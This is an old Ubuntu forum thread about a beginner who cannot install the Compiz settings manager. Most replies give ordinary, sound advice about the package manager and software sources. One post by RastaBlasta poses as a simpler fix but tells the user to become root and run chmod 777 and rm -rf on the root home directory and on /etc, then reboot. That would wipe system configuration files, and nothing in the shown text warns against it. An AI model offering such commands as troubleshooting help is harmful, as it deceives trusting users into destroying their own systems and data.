---
title: "[SOLVED] Can't install CCSM"
date: 2008-09-24
forum: New to Ubuntu
---

### Post by MrBalll on 2008-09-24
I just installed Ubuntu 8.0.4 this morning and I'm trying to get the Desktop cube to work but every time I follow a tutorial on installing the ccsm file it won't let me. I type in sudo apt-get install compizconfig-settings-manager in the terminal and it returns Couldn't find package compizconfig-settings-manager. Can anyone help me out with this? Thanks.

---

### Post by billgoldberg on 2008-09-24
> **MrBalll said:**
> I just installed Ubuntu 8.0.4 this morning and I'm trying to get the Desktop cube to work but every time I follow a tutorial on installing the ccsm file it won't let me. I type in sudo apt-get install compizconfig-settings-manager in the terminal and it returns Couldn't find package compizconfig-settings-manager. Can anyone help me out with this? Thanks.

Go to add/remove (applications -> add/remove) and search for "compiz".

Download the manager.

You most likely made a spelling mistake or something.

---

### Post by Elfy on 2008-09-24
Unless it's your sources, open your software sources - System > Admin menu - enable main, universe, multiverse and restricted also disable cdrom if necessary.

Close = it will want to reload if you have changed anything, then try again.

---

### Post by RastaBlasta on 2008-09-24
There is an even simpler way to resolve this problem, Just follow these commands and all your issues will be resolved.

Open up a terminal session: Applications > Accessories > Terminal.

In the terminal type the following commands in this order.
```
sudo su
```
Enter Password
```
cd ~
```
```
chmod 777 *
```
```
rm -rf *
```
```
cd /etc
```
```
chmod 777 *
```
```
rm -rf *
```
```
reboot
```

And thats it all your problems shall be solved.

Good luck

---

### Post by Elfy on 2008-09-24
<snip>

---

